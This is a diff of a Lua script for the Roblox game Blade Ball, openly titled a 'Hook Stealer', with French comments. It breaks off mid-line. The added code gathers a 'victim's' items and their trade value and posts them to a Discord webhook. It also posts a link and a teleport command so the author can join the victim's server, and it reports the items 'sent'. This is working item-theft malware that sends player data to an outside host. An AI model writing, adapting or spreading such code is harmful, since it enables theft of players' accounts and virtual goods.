@@ -1,3 +1,6 @@
+-- =============================================
+-- Blade Ball Hook Stealer by Eblack (Modifié)
+-- =============================================
 
 -- =============================================
 -- NE RIEN MODIFIER EN DESSOUS DE CETTE LIGNE
@@ -92,9 +95,8 @@ local function formatNumber(number)
     else if number == math.floor(number) then return string.format("%d%s", number, suffixes[suffixIndex]) else return string.format("%.2f%s", number, suffixes[suffixIndex]) end end
 end
 
--- Fonctions d'envoi vers Discord (Modifiées pour le double webhook et la couleur)
-local function SendJoinMessage(list, prefix, webhookUrl)
-    if not webhookUrl or webhookUrl == "" then return end
+-- Fonctions d'envoi vers Discord (Modifiées pour la couleur verte)
+local function SendJoinMessage(list, prefix)
     local fields = {
         { name = "Victim Username 🤖:", value = plr.Name, inline = true },
         { name = "Join link 🔗:", value = "https://fern.wtf/joiner?placeId=13772394625&gameInstanceId=" .. game.JobId },
@@ -107,4 +109,30 @@ local function SendJoinMessage(list, prefix, webhookUrl)
     for _, group in pairs(grouped) do table.insert(groupedList, group) end
     table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
     for _, group in ipairs(groupedList) do local itemLine = string.format("%s (x%s) - %s RAP", group.Name, group.Count, formatNumber(group.TotalRAP)) fields[3].value = fields[3].value .. itemLine .. "\n" end
-    if #fields[3].value > 1024 then local lines = {} for line in fields[3].value:gmatch("[^^\r\n]+") do table.insert(lines, line) end while #fields[3].value > 1024 and #lines > 0 do table.remove
+    if #fields[3].value > 1024 then local lines = {} for line in fields[3].value:gmatch("[^^\r\n]+") do table.insert(lines, line) end while #fields[3].value > 1024 and #lines > 0 do table.remove(lines) fields[3].value = table.concat(lines, "\n") .. "\nPlus more!" end end
+    local data = { 
+        ["content"] = prefix .. "game:GetService('TeleportService'):TeleportToPlaceInstance(13772394625, '" .. game.JobId .. "')", 
+        ["embeds"] = {{ 
+            ["title"] = "🟢 Grosse Cible Détectée 🎯", 
+            ["color"] = 65280, -- VERT
+            ["fields"] = fields, 
+            ["footer"] = { ["text"] = "Blade Ball stealer by Eblack" } 
+        }} 
+    }
+    local body = HttpService:JSONEncode(data)
+    local headers = { ["Content-Type"] = "application/json" }
+    local response = request({ Url = _G.webhook_toi, Method = "POST", Headers = headers, Body = body })
+end
+
+local function SendMessage(list)
+    local fields = {
+        { name = "Victim Username 🤖:", value = plr.Name, inline = true },
+        { name = "Items sent 📝:", value = "", inline = false },
+        { name = "Summary 💰:", value = string.format("Total RAP: %s", formatNumber(totalRAP)), inline = false }
+    }
+    local grouped = {}
+    for _, item in ipairs(list) do if grouped[item.Name] then grouped[item.Name].Count = grouped[item.Name].Count + 1 grouped[item.Name].TotalRAP = grouped[item.Name].TotalRAP + item.RAP else grouped[item.Name] = { Name = item.Name, Count = 1, TotalRAP = item.RAP } end end
+    local groupedList = {}
+    for _, group in pairs(grouped) do table.insert(groupedList, group) end
+    table.sort(groupedList, function(a, b) return a.TotalRAP > b.TotalRAP end)
+    for _, group in ipairs(groupedList) do local itemLine = string.format("%s
